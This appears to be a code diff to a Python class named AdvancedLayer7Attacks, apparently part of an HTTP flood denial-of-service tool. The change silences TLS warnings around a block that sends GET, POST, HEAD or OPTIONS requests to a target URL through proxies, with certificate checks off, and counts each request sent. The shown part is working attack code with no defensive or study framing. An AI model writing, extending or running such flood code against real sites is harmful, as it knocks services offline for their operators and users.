@@ -7,7 +7,9 @@ import random
 import time
 import threading
 import uuid
+import warnings
 import requests
+import urllib3
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 
@@ -97,41 +99,43 @@ class AdvancedLayer7Attacks:
                         }
                     
                     # Send request
-                    if method == 'GET':
-                        response = self.session.get(
-                            self.target_url, 
-                            headers=headers, 
-                            params=params,
-                            proxies=proxy,
-                            timeout=10,
-                            verify=False
-                        )
-                    elif method == 'POST':
-                        data = {k: v for k, v in params.items()}
-                        response = self.session.post(
-                            self.target_url,
-                            headers=headers,
-                            data=data,
-                            proxies=proxy,
-                            timeout=10,
-                            verify=False
-                        )
-                    elif method == 'HEAD':
-                        response = self.session.head(
-                            self.target_url,
-                            headers=headers,
-                            proxies=proxy,
-                            timeout=10,
-                            verify=False
-                        )
-                    else:  # OPTIONS
-                        response = self.session.options(
-                            self.target_url,
-                            headers=headers,
-                            proxies=proxy,
-                            timeout=10,
-                            verify=False
-                        )
+                    with warnings.catch_warnings():
+                        warnings.simplefilter('ignore', urllib3.exceptions.InsecureRequestWarning)
+                        if method == 'GET':
+                            response = self.session.get(
+                                self.target_url,
+                                headers=headers,
+                                params=params,
+                                proxies=proxy,
+                                timeout=10,
+                                verify=False
+                            )
+                        elif method == 'POST':
+                            data = {k: v for k, v in params.items()}
+                            response = self.session.post(
+                                self.target_url,
+                                headers=headers,
+                                data=data,
+                                proxies=proxy,
+                                timeout=10,
+                                verify=False
+                            )
+                        elif method == 'HEAD':
+                            response = self.session.head(
+                                self.target_url,
+                                headers=headers,
+                                proxies=proxy,
+                                timeout=10,
+                                verify=False
+                            )
+                        else:  # OPTIONS
+                            response = self.session.options(
+                                self.target_url,
+                                headers=headers,
+                                proxies=proxy,
+                                timeout=10,
+                                verify=False
+                            )
                     
                     self.requests_sent += 1
                     if response.status_code < 400:
